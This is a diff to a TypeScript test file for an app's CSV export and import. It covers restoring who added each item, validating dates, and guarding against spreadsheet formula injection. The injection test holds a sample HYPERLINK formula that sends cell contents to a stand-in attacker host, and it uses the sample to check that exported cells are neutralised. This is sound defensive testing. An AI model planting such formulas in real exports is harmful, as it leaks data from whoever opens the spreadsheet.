@@ -10,6 +10,7 @@ import {
   createItem,
   createLibrary,
   createUser,
+  deleteUser,
   gamesForTonight,
   getItem,
   setItemTags,
@@ -135,6 +136,70 @@ describe('a Nalanda export, imported again', () => {
     }
   });
 
+  it('says who added each item, and gives it back to them — a member of that name in an admin’s import, else the importer', async () => {
+    const admin = await createUser(env.DB, { username: 'admin', passwordHash: 'pbkdf2$1$x$y', role: 'admin', mustChangePassword: false });
+    const ravi = await createUser(env.DB, { username: 'ravi', passwordHash: 'pbkdf2$1$x$y', role: 'member', mustChangePassword: false });
+    const gone = await createUser(env.DB, { username: 'gone', passwordHash: 'pbkdf2$1$x$y', role: 'member', mustChangePassword: false });
+    const cookieOf = async (u: typeof admin) => `${SESSION_COOKIE}=${await createSessionToken(env.SESSION_SECRET, u, Math.floor(Date.now() / 1000))}`;
+    const shelf = await createLibrary(env.DB, 'Shelf');
+    await createItem(env.DB, { libraryId: shelf.id, mediaType: 'book', title: 'Ravi’s', addedBy: ravi.id, details: '{}' });
+    await createItem(env.DB, { libraryId: shelf.id, mediaType: 'book', title: 'A former member’s', addedBy: gone.id, details: '{}' });
+    await createItem(env.DB, { libraryId: shelf.id, mediaType: 'book', title: 'Nobody’s', details: '{}' });
+    await deleteUser(env.DB, gone.id);
+
+    const rows = parseCsv((await call('/export.csv', await cookieOf(admin))).text);
+    expect(rows.map((r) => r.added_by)).toEqual(['ravi', '', '']); // the username; a former member is nobody now
+    rows.push({ ...rows[0]!, title: 'A stranger’s', added_by: 'nobody-here' });
+
+    const adderOf = async (libraryId: number) =>
+      (await env.DB.prepare('SELECT title, added_by AS by FROM items WHERE library_id = ?1 ORDER BY id').bind(libraryId).all<{ title: string; by: number | null }>()).results.map((r) => r.by);
+    // an admin's import keeps the member of that name; nobody named, or a name not here, is the importer's
+    const byAdmin = await createLibrary(env.DB, 'By the admin');
+    expect(JSON.parse((await call('/api/import', await cookieOf(admin), { libraryId: byAdmin.id, rows })).text)).toMatchObject({ inserted: 4 });
+    expect(await adderOf(byAdmin.id)).toEqual([ravi.id, admin.id, admin.id, admin.id]);
+    // a member's import is all theirs
+    const byRavi = await createLibrary(env.DB, 'By ravi');
+    const mira = await createUser(env.DB, { username: 'mira', passwordHash: 'pbkdf2$1$x$y', role: 'member', mustChangePassword: false });
+    expect(JSON.parse((await call('/api/import', await cookieOf(mira), { libraryId: byRavi.id, rows })).text)).toMatchObject({ inserted: 4 });
+    expect(await adderOf(byRavi.id)).toEqual([mira.id, mira.id, mira.id, mira.id]);
+  });
+
+  it('carries a title that reads as a formula, and a note that starts with a quote, out and back unchanged (§16 #91)', async () => {
+    const admin = await createUser(env.DB, { username: 'admin', passwordHash: 'pbkdf2$1$x$y', role: 'admin', mustChangePassword: false });
+    const cookie = `${SESSION_COOKIE}=${await createSessionToken(env.SESSION_SECRET, admin, Math.floor(Date.now() / 1000))}`;
+    const shelf = await createLibrary(env.DB, 'Shelf');
+    const formula = '=HYPERLINK("https://evil.example/?"&D2&E2,"Open")';
+    await createItem(env.DB, { libraryId: shelf.id, mediaType: 'book', title: formula, creators: '+1 Forever', notes: "'quoted", location: '-', details: '{}' });
+    await createItem(env.DB, { libraryId: shelf.id, mediaType: 'book', title: '=1+1', details: '{}' });
+    await createItem(env.DB, { libraryId: shelf.id, mediaType: 'book', title: "'Salem's Lot", creators: 'Stephen King', details: '{}' }); // really begins with an apostrophe
+
+    const csv = (await call('/export.csv?after=0', cookie)).text;
+    // a spreadsheet reads a cell starting with ' as text and shows the rest: no cell leaves as a formula
+    expect(csv).toContain(`"'=HYPERLINK(""https://evil.example/?""&D2&E2,""Open"")"`);
+    expect(csv).toMatch(/(^|,)'=1\+1(,|\r\n)/m);
+    expect(csv).toContain(",'+1 Forever,");
+    expect(csv).toContain(",''quoted,'-,");
+    expect(csv).toContain("''Salem's Lot,Stephen King,"); // guarded on the way out, since a leading ' is itself a guard
+    for (const line of csv.split('\r\n').slice(1).filter(Boolean)) for (const cell of parseCsv(csv.split('\r\n')[0] + '\r\n' + line)) for (const v of Object.values(cell)) expect(v).not.toMatch(/^[=+\-@\t\r]/);
+
+    const target = await createLibrary(env.DB, 'Restored');
+    expect(JSON.parse((await call('/api/import', cookie, { libraryId: target.id, rows: parseCsv(csv) })).text)).toMatchObject({ inserted: 3, skipped: 0 });
+    const back = (await env.DB.prepare('SELECT title, creators, notes, location FROM items WHERE library_id = ?1 ORDER BY id').bind(target.id).all<Record<string, string | null>>()).results;
+    expect(back).toEqual([
+      { title: formula, creators: '+1 Forever', notes: "'quoted", location: '-' },
+      { title: '=1+1', creators: null, notes: null, location: null },
+      { title: "'Salem's Lot", creators: 'Stephen King', notes: null, location: null },
+    ]);
+
+    // an export from before the guard never wrote one: a title that begins with an apostrophe comes back as it was,
+    // and only a guard before a guarded character is taken off
+    const older = csv.replace("''Salem's Lot", "'Salem's Lot");
+    const again = await createLibrary(env.DB, 'Older');
+    expect(JSON.parse((await call('/api/import', cookie, { libraryId: again.id, rows: parseCsv(older) })).text)).toMatchObject({ inserted: 3 });
+    const titles = (await env.DB.prepare('SELECT title FROM items WHERE library_id = ?1 ORDER BY id').bind(again.id).all<{ title: string }>()).results.map((r) => r.title);
+    expect(titles).toEqual([formula, '=1+1', "'Salem's Lot"]);
+  });
+
   it('brings a board game’s BGG facts back — its weight among them — so it fits tonight’s filters as before (§16 #60)', async () => {
     const admin = await createUser(env.DB, { username: 'admin', passwordHash: 'pbkdf2$1$x$y', role: 'admin', mustChangePassword: false });
     const cookie = `${SESSION_COOKIE}=${await createSessionToken(env.SESSION_SECRET, admin, Math.floor(Date.now() / 1000))}`;
@@ -182,6 +247,12 @@ describe('a Nalanda export, imported again', () => {
     expect(row({ length: '1e5' }).length).toBeNull();
     expect(row({ rating: '11' }).rating).toBeNull();
     expect(row({ began_on: 'not a date', completed_on: '2026-09-28' })).toMatchObject({ beganOn: null, completedOn: '2026-09-28' });
+    // a hand-edited date is a calendar date and a time of day, or nothing: 2024-13-45 never reaches added_at
+    expect(row({ completed_on: '2024-13-45' }).completedOn).toBeNull();
+    expect(row({ added_at: '2024-13-45 00:00:00' })).not.toHaveProperty('addedAt');
+    expect(row({ added_at: '2023-02-29 00:00:00' })).not.toHaveProperty('addedAt');
+    expect(row({ added_at: '2024-02-29 24:00:00' })).not.toHaveProperty('addedAt');
+    expect(row({ added_at: '2024-02-29 23:59:59' }).addedAt).toBe('2024-02-29 23:59:59');
   });
 });
 
